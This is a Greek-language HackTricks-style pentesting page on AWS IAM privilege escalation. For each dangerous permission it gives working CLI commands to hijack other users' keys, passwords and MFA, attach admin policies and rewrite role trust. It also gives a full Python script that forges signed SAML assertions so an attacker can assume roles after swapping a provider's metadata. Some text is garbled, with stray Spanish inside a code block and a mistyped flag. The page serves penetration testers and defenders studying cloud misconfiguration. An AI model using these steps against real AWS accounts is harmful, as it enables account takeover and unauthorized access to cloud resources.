# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

Για περισσότερες πληροφορίες σχετικά με το IAM δείτε:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Παρέχει τη δυνατότητα δημιουργίας νέας έκδοσης πολιτικής IAM, παρακάμπτοντας την ανάγκη για την άδεια `iam:SetDefaultPolicyVersion` χρησιμοποιώντας την παράμετρο `--set-as-default`. Αυτό επιτρέπει τον ορισμό προσαρμοσμένων δικαιωμάτων.

**Εντολή Εκμετάλλευσης:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Επίπτωση:** Αναβαθμίζει άμεσα τα δικαιώματα επιτρέποντας οποιαδήποτε ενέργεια σε οποιονδήποτε πόρο.

### **`iam:SetDefaultPolicyVersion`**

Επιτρέπει την αλλαγή της προεπιλεγμένης έκδοσης μιας πολιτικής IAM σε άλλη υπάρχουσα έκδοση, ενδεχομένως αυξάνοντας τα δικαιώματα αν η νέα έκδοση παρέχει περισσότερες άδειες.

**Εντολή Bash:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Επίπτωση:** Έμμεση κλιμάκωση προνομίων επιτρέποντας περισσότερα δικαιώματα.

### **`iam:CreateAccessKey`, (`iam:DeleteAccessKey`)**

Επιτρέπει τη δημιουργία access key ID και secret access key για άλλον χρήστη, οδηγώντας σε πιθανή κλιμάκωση προνομίων.

**Εκμετάλλευση:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Επίπτωση:** Άμεση κλιμάκωση προνομίων αναλαμβάνοντας τα εκτεταμένα δικαιώματα ενός άλλου χρήστη.

Σημειώστε ότι ένας χρήστης μπορεί να έχει μόνο 2 access keys δημιουργημένα, οπότε αν ένας χρήστης έχει ήδη 2 access keys, θα χρειαστείτε την άδεια `iam:DeleteAccessKey` για να διαγράψετε ένα από αυτά ώστε να μπορέσετε να δημιουργήσετε ένα νέο:
```bash
aws iam delete-access-key --uaccess-key-id <key_id>
```
### **`iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`**

Αν μπορείτε να δημιουργήσετε μια νέα virtual MFA device και να την ενεργοποιήσετε για άλλον χρήστη, μπορείτε ουσιαστικά να εγγράψετε το δικό σας MFA για εκείνον και στη συνέχεια να ζητήσετε μια MFA-backed συνεδρία χρησιμοποιώντας τα διαπιστευτήριά του.

**Exploit:**
```bash
# Create a virtual MFA device (this returns the serial and the base32 seed)
aws iam create-virtual-mfa-device --virtual-mfa-device-name <mfa_name>

# Generate 2 consecutive TOTP codes from the seed, then enable it for the user
aws iam enable-mfa-device --user-name <target_user> --serial-number <serial> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impact:** Άμεση κλιμάκωση προνομίων με κατάληψη της εγγραφής MFA ενός χρήστη (και στη συνέχεια χρήση των δικαιωμάτων του).

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Επιτρέπει τη δημιουργία ή ενημέρωση ενός προφίλ σύνδεσης, συμπεριλαμβανομένης της ρύθμισης κωδικών για σύνδεση στην κονσόλα AWS, οδηγώντας σε άμεση κλιμάκωση προνομίων.

**Exploit for Creation:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Exploit για ενημέρωση:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Επίπτωση:** Direct privilege escalation by logging in as "any" user.

### **`iam:UpdateAccessKey`**

Επιτρέπει την ενεργοποίηση ενός απενεργοποιημένου access key, ενδεχομένως οδηγώντας σε μη εξουσιοδοτημένη πρόσβαση εάν ο attacker κατέχει το απενεργοποιημένο key.

**Εκμετάλλευση:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Επίπτωση:** Άμεση κλιμάκωση προνομίων μέσω επανενεργοποίησης access keys.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Επιτρέπει τη δημιουργία ή επαναφορά διαπιστευτηρίων για συγκεκριμένες AWS υπηρεσίες (συνήθως **CodeCommit**). Αυτά **δεν** είναι AWS API keys: είναι διαπιστευτήρια **username/password** για μια συγκεκριμένη υπηρεσία, και μπορείτε να τα χρησιμοποιήσετε μόνο όπου αυτή η υπηρεσία τα αποδέχεται.

**Δημιουργία:**
```bash
aws iam create-service-specific-credential --user-name <target_user> --service-name codecommit.amazonaws.com
```
Αποθηκεύστε:

- `ServiceSpecificCredential.ServiceUserName`
- `ServiceSpecificCredential.ServicePassword`

**Παράδειγμα:**
```bash
# Find a repository you can access as the target
aws codecommit list-repositories

export REPO_NAME="<repo_name>"
export AWS_REGION="us-east-1" # adjust if needed

# Git URL (HTTPS)
export CLONE_URL="https://git-codecommit.${AWS_REGION}.amazonaws.com/v1/repos/${REPO_NAME}"

# Clone and use the ServiceUserName/ServicePassword when prompted
git clone "$CLONE_URL"
cd "$REPO_NAME"
```
> Σημείωση: Ο κωδικός της υπηρεσίας συχνά περιέχει χαρακτήρες όπως `+`, `/` και `=`. Η χρήση του interactive prompt είναι συνήθως η ευκολότερη. Αν το ενσωματώσετε σε URL, URL-encode το πρώτα.

Σε αυτό το σημείο μπορείτε να διαβάσετε ό,τι μπορεί να προσπελάσει ο target user στο CodeCommit (π.χ., a leaked credentials file). Αν ανακτήσετε **AWS access keys** από το repo, ρυθμίστε ένα νέο προφίλ AWS CLI με αυτά τα κλειδιά και στη συνέχεια αποκτήστε πρόσβαση σε resources (για παράδειγμα, διαβάστε ένα flag από Secrets Manager):
```bash
aws secretsmanager get-secret-value --secret-id <secret_name> --profile <new_profile>
```
**Επαναφορά:**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Επίπτωση:** Privilege escalation στα δικαιώματα του στοχευόμενου χρήστη για την αντίστοιχη υπηρεσία (και ενδεχομένως πέραν αυτής εάν κάνετε pivot χρησιμοποιώντας δεδομένα που ανακτήθηκαν από αυτήν την υπηρεσία).

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Επιτρέπει την επισύναψη πολιτικών σε χρήστες ή ομάδες, οδηγώντας σε άμεση escalating privileges μέσω της κληρονόμησης των δικαιωμάτων της επισυναπτόμενης πολιτικής.

**Exploit για χρήστη:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit για Ομάδα:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Επίπτωση:** Direct privilege escalation to anything the policy grants.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Επιτρέπει την επισύναψη ή προσθήκη πολιτικών σε ρόλους, χρήστες ή ομάδες, επιτρέποντας direct privilege escalation με την παροχή επιπλέον δικαιωμάτων.

**Exploit for Role:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Εκμετάλλευση για Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Μπορείτε να χρησιμοποιήσετε μια πολιτική όπως:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Επίπτωση:** Άμεση κλιμάκωση προνομίων με την προσθήκη δικαιωμάτων μέσω πολιτικών.

### **`iam:AddUserToGroup`**

Επιτρέπει σε κάποιον να προσθέσει τον εαυτό του σε ομάδα IAM, αυξάνοντας τα προνόμια μέσω κληρονομίας των δικαιωμάτων της ομάδας.

**Exploit:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Επίπτωση:** Άμεση κλιμάκωση προνομίων στο επίπεδο των δικαιωμάτων της ομάδας.

### **`iam:UpdateAssumeRolePolicy`**

Επιτρέπει την τροποποίηση του assume role policy document ενός ρόλου, επιτρέποντας την ανάληψη του ρόλου και των συσχετιζόμενων δικαιωμάτων του.

**Εκμετάλλευση:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Όπου η πολιτική φαίνεται ως εξής, η οποία δίνει στον χρήστη άδεια να αναλάβει τον ρόλο:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Επίπτωση:** Άμεση κλιμάκωση προνομίων με την ανάληψη των δικαιωμάτων οποιουδήποτε role.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Επιτρέπει την αποστολή δημόσιου κλειδιού SSH για πιστοποίηση σε CodeCommit και την απενεργοποίηση συσκευών MFA, οδηγώντας σε πιθανή έμμεση κλιμάκωση προνομίων.

**Exploit for SSH Key Upload:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Exploit για απενεργοποίηση MFA:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Επίπτωση:** Indirect privilege escalation μέσω της ενεργοποίησης πρόσβασης στο CodeCommit ή της απενεργοποίησης της προστασίας MFA.

### **`iam:ResyncMFADevice`**

Επιτρέπει τον επανασυγχρονισμό μιας συσκευής MFA, ενδεχομένως οδηγώντας σε indirect privilege escalation μέσω χειρισμού της προστασίας MFA.

**Εντολή Bash:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Επίπτωση:** Έμμεση κλιμάκωση προνομίων με την προσθήκη ή χειραγώγηση συσκευών MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Με αυτά τα δικαιώματα μπορείτε να **αλλάξετε τα XML metadata της SAML σύνδεσης**. Στη συνέχεια, μπορείτε να καταχραστείτε τη **SAML federation** για να **login** με οποιοδήποτε **role** που την εμπιστεύεται.

Σημειώστε ότι κάνοντας αυτό **οι legit χρήστες δεν θα μπορούν να login**. Ωστόσο, μπορείτε να αποκτήσετε το XML, οπότε μπορείτε να βάλετε το δικό σας, να login και να επαναφέρετε την προηγούμενη ρύθμιση.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
**Επίθεση από άκρο σε άκρο:**

1. Εντοπίστε τον SAML provider και ένα role που τον εμπιστεύεται:
```bash
export AWS_REGION=${AWS_REGION:-us-east-1}

aws iam list-saml-providers
export PROVIDER_ARN="arn:aws:iam::<ACCOUNT_ID>:saml-provider/<PROVIDER_NAME>"

# Backup current metadata so you can restore it later:
aws iam get-saml-provider --saml-provider-arn "$PROVIDER_ARN" > /tmp/saml-provider-backup.json

# Find candidate roles and inspect their trust policy to confirm they allow sts:AssumeRoleWithSAML:
aws iam list-roles | grep -i saml || true
aws iam get-role --role-name "<ROLE_NAME>"
export ROLE_ARN="arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME>"
```
2. Πλαστογραφήστε IdP metadata + μια υπογεγραμμένη SAML assertion για το ζεύγος role/provider:
```bash
python3 -m venv /tmp/saml-federation-venv
source /tmp/saml-federation-venv/bin/activate
pip install lxml signxml

# Create /tmp/saml_forge.py from the expandable below first:
python3 /tmp/saml_forge.py --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" > /tmp/saml-forge.json
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-forge.json","r"))
open("/tmp/saml-metadata.xml","w").write(j["metadata_xml"])
open("/tmp/saml-assertion.b64","w").write(j["assertion_b64"])
print("Wrote /tmp/saml-metadata.xml and /tmp/saml-assertion.b64")
PY
```
<details>
<summary>Επεκτάσιμο: <code>/tmp/saml_forge.py</code> βοηθητικό (μεταδεδομένα + υπογεγραμμένη δήλωση)</summary>
```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import datetime as dt
import json
import os
import subprocess
import tempfile
import uuid

from lxml import etree
from signxml import XMLSigner, methods


def _run(cmd: list[str]) -> str:
p = subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
return p.stdout


def _openssl_make_key_and_cert(tmpdir: str) -> tuple[str, str]:
key_path = os.path.join(tmpdir, "key.pem")
cert_path = os.path.join(tmpdir, "cert.pem")
_run(
[
"openssl",
"req",
"-x509",
"-newkey",
"rsa:2048",
"-keyout",
key_path,
"-out",
cert_path,
"-days",
"3650",
"-nodes",
"-subj",
"/CN=attacker-idp",
]
)
return key_path, cert_path


def _pem_cert_to_b64(cert_pem: str) -> str:
lines: list[str] = []
for line in cert_pem.splitlines():
if "BEGIN CERTIFICATE" in line or "END CERTIFICATE" in line:
continue
line = line.strip()
if line:
lines.append(line)
return "".join(lines)


def make_metadata_xml(cert_b64: str) -> str:
return f"""<?xml version="1.0"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://attacker.invalid/idp">
<IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
<KeyDescriptor use="signing">
<KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
<X509Data>
<X509Certificate>{cert_b64}</X509Certificate>
</X509Data>
</KeyInfo>
</KeyDescriptor>
<SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://attacker.invalid/sso"/>
</IDPSSODescriptor>
</EntityDescriptor>
"""


def make_signed_saml_response(role_arn: str, principal_arn: str, key_pem: str, cert_pem: str) -> bytes:
ns = {
"saml2p": "urn:oasis:names:tc:SAML:2.0:protocol",
"saml2": "urn:oasis:names:tc:SAML:2.0:assertion",
}

issue_instant = dt.datetime.now(dt.timezone.utc)
not_before = issue_instant - dt.timedelta(minutes=2)
not_on_or_after = issue_instant + dt.timedelta(minutes=10)

resp_id = "_" + str(uuid.uuid4())
assertion_id = "_" + str(uuid.uuid4())

response = etree.Element(etree.QName(ns["saml2p"], "Response"), nsmap=ns)
response.set("ID", resp_id)
response.set("Version", "2.0")
response.set("IssueInstant", issue_instant.isoformat())
response.set("Destination", "https://signin.aws.amazon.com/saml")

issuer = etree.SubElement(response, etree.QName(ns["saml2"], "Issuer"))
issuer.text = "https://attacker.invalid/idp"

status = etree.SubElement(response, etree.QName(ns["saml2p"], "Status"))
status_code = etree.SubElement(status, etree.QName(ns["saml2p"], "StatusCode"))
status_code.set("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

assertion = etree.SubElement(response, etree.QName(ns["saml2"], "Assertion"))
assertion.set("ID", assertion_id)
assertion.set("Version", "2.0")
assertion.set("IssueInstant", issue_instant.isoformat())

a_issuer = etree.SubElement(assertion, etree.QName(ns["saml2"], "Issuer"))
a_issuer.text = "https://attacker.invalid/idp"

subject = etree.SubElement(assertion, etree.QName(ns["saml2"], "Subject"))
name_id = etree.SubElement(subject, etree.QName(ns["saml2"], "NameID"))
name_id.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified")
name_id.text = "attacker"

subject_conf = etree.SubElement(subject, etree.QName(ns["saml2"], "SubjectConfirmation"))
subject_conf.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
subject_conf_data = etree.SubElement(subject_conf, etree.QName(ns["saml2"], "SubjectConfirmationData"))
subject_conf_data.set("NotOnOrAfter", not_on_or_after.isoformat())
subject_conf_data.set("Recipient", "https://signin.aws.amazon.com/saml")

conditions = etree.SubElement(assertion, etree.QName(ns["saml2"], "Conditions"))
conditions.set("NotBefore", not_before.isoformat())
conditions.set("NotOnOrAfter", not_on_or_after.isoformat())

audience_restriction = etree.SubElement(conditions, etree.QName(ns["saml2"], "AudienceRestriction"))
audience = etree.SubElement(audience_restriction, etree.QName(ns["saml2"], "Audience"))
audience.text = "https://signin.aws.amazon.com/saml"

attr_stmt = etree.SubElement(assertion, etree.QName(ns["saml2"], "AttributeStatement"))

attr_role = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_role.set("Name", "https://aws.amazon.com/SAML/Attributes/Role")
attr_role_value = etree.SubElement(attr_role, etree.QName(ns["saml2"], "AttributeValue"))
attr_role_value.text = f"{role_arn},{principal_arn}"

attr_session = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_session.set("Name", "https://aws.amazon.com/SAML/Attributes/RoleSessionName")
attr_session_value = etree.SubElement(attr_session, etree.QName(ns["saml2"], "AttributeValue"))
attr_session_value.text = "saml-session"

key_bytes = open(key_pem, "rb").read()
cert_bytes = open(cert_pem, "rb").read()

signer = XMLSigner(
method=methods.enveloped,
signature_algorithm="rsa-sha256",
digest_algorithm="sha256",
c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
)
signed_assertion = signer.sign(
assertion,
key=key_bytes,
cert=cert_bytes,
reference_uri=f"#{assertion_id}",
id_attribute="ID",
)

response.remove(assertion)
response.append(signed_assertion)

return etree.tostring(response, xml_declaration=True, encoding="utf-8")


def main() -> None:
ap = argparse.ArgumentParser()
ap.add_argument("--role-arn", required=True)
ap.add_argument("--principal-arn", required=True)
args = ap.parse_args()

with tempfile.TemporaryDirectory() as tmp:
key_path, cert_path = _openssl_make_key_and_cert(tmp)
cert_pem = open(cert_path, "r", encoding="utf-8").read()
cert_b64 = _pem_cert_to_b64(cert_pem)

metadata_xml = make_metadata_xml(cert_b64)
saml_xml = make_signed_saml_response(args.role_arn, args.principal_arn, key_path, cert_path)
saml_b64 = base64.b64encode(saml_xml).decode("ascii")

print(json.dumps({"metadata_xml": metadata_xml, "assertion_b64": saml_b64}))


if __name__ == "__main__":
main()
```
</details>

3. Ενημερώστε τα metadata του SAML provider με το πιστοποιητικό του IdP σας, αναλάβετε τον ρόλο και χρησιμοποιήστε τα επιστρεφόμενα STS credentials:
```bash
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata.xml

# Assertion is base64 and can be long. Keep it on one line:
ASSERTION_B64=$(tr -d '\n' </tmp/saml-assertion.b64)
SESSION_LINE=$(aws sts assume-role-with-saml --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" --saml-assertion "$ASSERTION_B64" \
--query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken,Expiration]' --output text)
IFS=$'\t' read -r SESSION_AK SESSION_SK SESSION_ST SESSION_EXP <<<"$SESSION_LINE"
echo "Session expires at: $SESSION_EXP"

# Use creds inline (no need to create an AWS CLI profile):
AWS_ACCESS_KEY_ID="$SESSION_AK" AWS_SECRET_ACCESS_KEY="$SESSION_SK" AWS_SESSION_TOKEN="$SESSION_ST" AWS_REGION="$AWS_REGION" \
aws sts get-caller-identity
```
4. Καθαρισμός: επαναφορά προηγούμενων μεταδεδομένων:
```bash
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-provider-backup.json","r"))
open("/tmp/saml-metadata-original.xml","w").write(j["SAMLMetadataDocument"])
PY
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata-original.xml
```
> [!WARNING]
> Η ενημέρωση των μεταδεδομένων του παρόχου SAML προκαλεί διαταραχή: ενώ τα μεταδεδομένα σας είναι στη θέση τους, οι νόμιμοι χρήστες SSO ενδέχεται να μην μπορούν να αυθεντικοποιηθούν.
 
### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Δεν είμαι σίγουρος γι' αυτό) Εάν ένας επιτιθέμενος έχει αυτές τις **permissions**, θα μπορούσε να προσθέσει ένα νέο **Thumbprint** και έτσι να καταφέρει να συνδεθεί σε όλους τους ρόλους που εμπιστεύονται τον πάροχο.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

Αυτό το permission επιτρέπει σε έναν attacker να ενημερώσει το permissions boundary ενός user, ενδεχομένως κλιμακώνοντας τα προνόμια του επιτρέποντάς του να εκτελεί ενέργειες που κανονικά περιορίζονται από τα υπάρχοντα permissions του.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

Ένας χρήστης με iam:PutRolePermissionsBoundary μπορεί να ορίσει ένα permissions boundary σε έναν υπάρχον ρόλο. Ο κίνδυνος προκύπτει όταν κάποιος με αυτή την άδεια αλλάζει το boundary ενός ρόλου: μπορεί να περιορίσει ακατάλληλα τις λειτουργίες (προκαλώντας διακοπή υπηρεσίας) ή, εάν επισυνάψει ένα permissive boundary, ουσιαστικά να διευρύνει αυτά που μπορεί να κάνει ο ρόλος και να escalate privileges.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Αναφορές

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
